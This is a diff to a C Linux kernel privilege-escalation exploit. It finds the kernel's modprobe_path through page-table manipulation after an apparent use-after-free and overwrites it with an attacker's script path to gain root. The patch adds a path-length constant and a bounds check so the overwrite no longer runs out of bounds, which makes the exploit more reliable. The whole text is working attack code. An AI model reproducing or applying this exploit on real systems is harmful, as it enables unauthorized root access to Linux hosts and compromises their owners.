@@ -196,6 +196,9 @@ int flush_tlb(void *addr, size_t len)
 #define MODPROBE_PATH_PHYS_ADDR (KERNEL_TEXT_PHYS_ADDR + MODPROBE_PATH_ADDR_OFFSET)
 #define MODPROBE_PATH_PTE_ENTRY ((MODPROBE_PATH_PHYS_ADDR & 0xfffffffffffff000lu) + PT_BITS)
 
+/* From include/linux/kmod.h */
+#define KMOD_PATH_LEN 256
+
 int get_modprobe_path(char *buf, size_t buf_size)
 {
 	int fd = -1;
@@ -238,7 +241,7 @@ int get_modprobe_path(char *buf, size_t buf_size)
 void *memmem_modprobe_path(void *memory, size_t memory_size)
 {
 	int ret = EXIT_FAILURE;
-	char modprobe_path[PATH_MAX] = { 0 };
+	char modprobe_path[KMOD_PATH_LEN] = { 0 };
 	size_t modprobe_path_len = 0;
 	char *modprobe_path_uaddr = NULL;
 
@@ -367,7 +370,7 @@ int main(void)
 	long reserved_from_n = 0;
 	long uaf_n = 0;
 	char act_args[DRILL_ACT_SIZE] = { 0 };
-	char privesc_script_path[PATH_MAX] = { 0 };
+	char privesc_script_path[KMOD_PATH_LEN] = { 0 };
 
 	printf("begin as: uid=%d, euid=%d\n", getuid(), geteuid());
 
@@ -487,7 +490,6 @@ int main(void)
 		unsigned long *addr = PT_INDICES_TO_VIRT(PGD_N, 0, 1, i, 0);
 		unsigned long val = *addr;
 		char *modprobe_path_uaddr = NULL;
-		size_t old_len = 0;
 		size_t new_len = 0;
 
 		if (val == MAGIC_VAL)
@@ -498,11 +500,11 @@ int main(void)
 		if (modprobe_path_uaddr == NULL)
 			break;
 
-		old_len = strlen(modprobe_path_uaddr);
 		new_len = strlen(privesc_script_path);
-		printf("[!] modprobe_path len %zu, privesc_script_path len %zu\n", old_len, new_len);
-		if (new_len > old_len)
-			printf("[!] WARNING: not enough bytes in modprobe_path, gonna do OOB write\n");
+		if (new_len + 1 > KMOD_PATH_LEN) {
+			printf("[-] not enough bytes in modprobe_path\n");
+			break;
+		}
 
 		memcpy(modprobe_path_uaddr, privesc_script_path, new_len + 1); /* with null byte */
 		printf("[+] modprobe_path is changed to %s\n", privesc_script_path);
